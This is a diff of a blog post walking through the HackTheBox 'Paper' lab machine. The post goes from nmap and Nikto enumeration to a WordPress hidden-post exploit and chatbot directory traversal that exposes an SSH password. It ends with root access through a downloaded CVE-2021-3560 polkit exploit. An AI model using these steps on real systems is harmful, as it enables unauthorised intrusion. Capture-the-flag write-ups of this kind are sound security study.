@@ -2,22 +2,22 @@
 title: "Paper | HackTheBox"
 classes: wide
 header:
-  teaser: /assets/images/Blogs/Security/paper.png
+  teaser: /assets/images/security/paper.png
 ribbon: ForestGreen
 description: "My Writeup for Paper box from HackTheBox"
 categories:
   - Security
 tags:
   - HackTheBox
-toc: false
+toc: true
 ---
 
-Hi folks, Hossam aka 0xGhaxy is here :)
+Hi folks, Hossam aka 0xGhazy is here :)
 
 in this blog, I'll explain how to exploit [Paper](https://app.hackthebox.com/machines/Paper). It's an easy Linux machine. machine by [secnigma](https://app.hackthebox.com/users/92926) if you wanna watch my walkthrough rather than writeup you can check my Youtube video.
 
-
 ## Table of content:
+
 1. Enumeration
 2. Gain Access
 3. Privilege Escalation
@@ -49,7 +49,7 @@ Host is up (0.15s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
 |   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
 |_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
@@ -59,14 +59,14 @@ PORT    STATE SERVICE  VERSION
 |_http-generator: WordPress 5.2.3
 443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
 |_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
+| tls-alpn:
 |_  http/1.1
 |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
 | Subject Alternative Name: DNS:localhost.localdomain
 | Not valid before: 2021-07-03T08:52:34
 |_Not valid after:  2022-07-08T10:32:34
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-title: HTTP Server Test Page powered by CentOS
 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
@@ -77,7 +77,7 @@ Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds
 
 ![](https://user-images.githubusercontent.com/60070427/158586960-8850caf3-ea2a-416e-98c8-4dbd4d7fd858.png)
 
-I tried to navigate to the target but found nothing useful there also using gobuster will produce nothing. so I tried to use Nikto a tool for enum this application.
+I tried to navigate to the target but found nothing useful there also using gobuster will produce nothing. so I tried to use `Nikto` a tool for enum this application.
 
 ## Nikto
 
@@ -97,7 +97,7 @@ I tried to navigate to the target but found nothing useful there also using gobu
 + Uncommon header 'x-backend-server' found, with contents: office.paper
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 + Retrieved x-powered-by header: PHP/7.2.24
-+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE 
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE
 + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
 + OSVDB-3092: /manual/: Web server manual found.
 + OSVDB-3268: /icons/: Directory indexing found.
@@ -205,7 +205,6 @@ our target using an outdated version of WordPress. I searched for an exploit for
 
 ![](https://user-images.githubusercontent.com/60070427/158589365-119c1743-5591-45c3-acf0-2333218f0c13.png)
 
-
 We will use WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts the exploit.
 
 to see the secret content, our link will be like this: http://office.paper/?static=1/2021/06/19/feeling-alone/ and we find it :)
@@ -233,7 +232,6 @@ After trying to list all available files it contains nothing useful so I try the
 
 ![](https://user-images.githubusercontent.com/60070427/158606081-9d1e451e-0a0e-4779-bd56-d2a05b7c6c20.png)
 
-
 Now we know a username dwight on the paper machine, Let's try to get more valuable information.
 
 ![](https://user-images.githubusercontent.com/60070427/158606075-3ee293de-443e-4262-9810-3caf2ade6051.png)
@@ -244,7 +242,7 @@ I found an interesting directory hubot which may be the home directory for the r
 
 ![](https://user-images.githubusercontent.com/60070427/158606066-4f87fe61-3481-4fcc-a971-f288335b7321.png)
 
-And finally, we get a password maybe-I'm from the future and I wanna say it's actually valid :)- it's valid in SSH. let's try to gain access to this machine 😎. 
+And finally, we get a password maybe-I'm from the future and I wanna say it's actually valid :)- it's valid in SSH. let's try to gain access to this machine 😎.
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/my-files]
@@ -255,7 +253,7 @@ This host key is known by the following other names/addresses:
     ~/.ssh/known_hosts:11: [hashed name]
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added 'office.paper' (ED25519) to the list of known hosts.
-dwight@office.paper's password: 
+dwight@office.paper's password:
 Activate the web console with: systemctl enable --now cockpit.socket
 
 Last login: Wed Mar 16 06:12:29 2022 from 10.10.14.66
@@ -299,14 +297,14 @@ XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx
 
 We have a user and need to get a root flag. if we try sudo -l we will get nothing useful.
 
-so I'll try linpeas.sh. we send this script by scp command. First download linpeas script.
+so I'll try `linpeas.sh`. we send this script by scp command. First download linpeas script.
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop/my-files]
 └─$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220314/linpeas.sh
 
 ┌──(kali㉿kali)-[~/Desktop/my-files]
-└─$ scp linpeas.sh dwight@office.paper:/home/dwight 
+└─$ scp linpeas.sh dwight@office.paper:/home/dwight
 ```
 
 Then connect to it again and change its permissions if needed via SSH
@@ -328,24 +326,24 @@ In my case, I'll use the Python script above by sending it to the target machine
 
 ```bash
 [dwight@paper ~]$ wget https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py
-[dwight@paper ~]$ python3 poc.py 
+[dwight@paper ~]$ python3 poc.py
 **************
 Exploit: Privilege escalation with polkit - CVE-2021-3560
 Exploit code written by Ahmad Almorabea @almorabea
-Original exploit author: Kevin Backhouse 
+Original exploit author: Kevin Backhouse
 For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
 **************
-[+] Starting the Exploit 
+[+] Starting the Exploit
 [+] User Created with the name of ahmed
 [+] Timed out at: 0.006322452546498194
 [+] Timed out at: 0.007741276567260387
-[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root 
+[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root
 bash: cannot set terminal process group (225477): Inappropriate ioctl for device
 bash: no job control in this shell
 [root@paper dwight]# cd /root
 [root@paper ~]# ls
-anaconda-ks.cfg  initial-setup-ks.cfg  root.txt                       
-[root@paper ~]# cat root.txt 
+anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
+[root@paper ~]# cat root.txt
 RootRootRootRootRootRootRootRoot
 ```
 
@@ -354,6 +352,7 @@ RootRootRootRootRootRootRootRoot
 First, we start with Nmap and find that we have open ports such as 80, 22, 443. if we try to gobuster our target we won't find any useful information and we'll be stuck there for a while. then I try Nikto to enum our target and I found office.paper the domain. and it's powered by WordPress so we'll scan it using wpscan and we'll get that our target using an outdated version that has a known exploit on the exploit database. then we get the hidden content of this blog and it helps us to reach the recyclops bot we use its functionality to gain more information from the server using directory traversal. to get the username and password from .env the file. and use this data to connect via SSH and scan our target using linpeas and get that our target is vulnerable to known CVE PolKit and we use this exploit to gain root access and submit the flag.
 
 # [+] What i have learned from this machine?
+
 - Try harder in the Enumeration stage.
 - Take notes and save your scan results.
 - If you are stuck read Machine forum for some help and hints such as:
